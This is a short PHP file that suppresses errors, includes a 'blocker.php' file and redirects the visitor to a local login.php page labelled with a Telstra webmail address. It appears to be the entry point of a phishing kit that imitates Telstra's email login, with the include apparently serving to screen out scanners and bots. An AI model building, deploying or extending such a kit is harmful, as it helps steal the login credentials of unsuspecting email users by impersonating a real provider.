<?php
error_reporting(0);
include ('blocker.php');
@session_start();
$distance = "login.php?goto=http%3A%2F%2Femail.telstra.com%3A443%2Fwebmail";
header("location: $distance");
?> 